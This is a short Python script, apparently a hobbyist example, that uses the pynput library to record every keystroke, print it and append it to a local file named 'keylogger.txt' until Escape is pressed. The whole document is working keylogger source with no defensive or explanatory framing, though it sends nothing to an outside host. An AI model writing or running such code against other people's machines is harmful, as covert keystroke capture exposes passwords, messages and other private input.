
#Code

from pynput.keyboard import Key, Listener 

k =[]

def on_press(key):
       k.append(key)
       write_1(k)
    
       print(key)


def on_release(key):

    if key ==  Key.esc:
        # Stop the listener when the Escape Key is released
        return False
    
def write_1(var):

    with open("keylogger.txt", "a") as f:

        for i in var:

            new_var = str(i).replace("'", '')
            f.write(new_var)
            f.write(" ")

# Create a listener instance
with Listener(on_press = on_press, on_release = on_release) as l:
    l.join()